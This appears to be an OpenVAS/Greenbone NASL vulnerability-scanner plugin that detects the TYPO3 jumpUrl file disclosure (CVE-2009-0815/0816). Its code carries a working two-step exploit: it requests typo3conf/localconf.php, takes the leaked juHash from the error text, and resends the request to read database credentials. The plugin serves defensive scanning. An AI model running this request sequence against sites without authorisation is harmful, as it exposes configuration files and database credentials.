# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803989");
  script_version("2025-01-21T05:37:33+0000");
  script_cve_id("CVE-2009-0815", "CVE-2009-0816");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2013-12-26 17:48:31 +0530 (Thu, 26 Dec 2013)");
  script_name("TYPO3 jumpUrl File Disclosure Vulnerability (TYPO3-SA-2009-002)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_typo3_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("typo3/http/detected");

  script_xref(name:"URL", value:"https://typo3.org/security/advisory/typo3-sa-2009-002");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id?1021710");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33714");

  script_tag(name:"summary", value:"TYPO3 is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple errors exist in the application:

  - An error exists in jumpUrl mechanism, which will disclose a hash secret.

  - An error exists in backend user interface, which fails to validate user supplied input
  properly.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal the
  victim's cookie-based authentication credentials or access arbitrary file.");

  script_tag(name:"affected", value:"TYPO3 versions 3.3.x, 3.5.x, 3.6.x, 3.7.x, 3.8.x, 4.0 through
  4.0.11, 4.1.0 through 4.1.9, 4.2.0 through 4.2.5 and 4.3alpha1.");

  script_tag(name:"solution", value:"Update to version 4.0.12, 4.1.10, 4.2.6 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("url_func.inc");
include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/?jumpurl=" + urlencode(str:"typo3conf/localconf.php") +
      "&type=0&juSecure=1&locationData=" + urlencode(str:"2:");

req = http_get(item:url, port:port);
res = http_send_recv(port:port, data:req);

hash = eregmatch(pattern:"jumpurl Secure: Calculated juHash, ([a-z0-9]+), did not match" , string:res);
if(!hash[1])
  exit(0);

hashURL = url + "&juHash=" + hash[1];

req = http_get(item:hashURL, port:port);
res = http_send_recv(port:port, data:req);

if(res && res =~ "^HTTP/1\.[01] 200" && "$typo_db" >< res &&
   "$typo_db_username" >< res) {
  report = http_report_vuln_url(port:port, url:hashURL);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
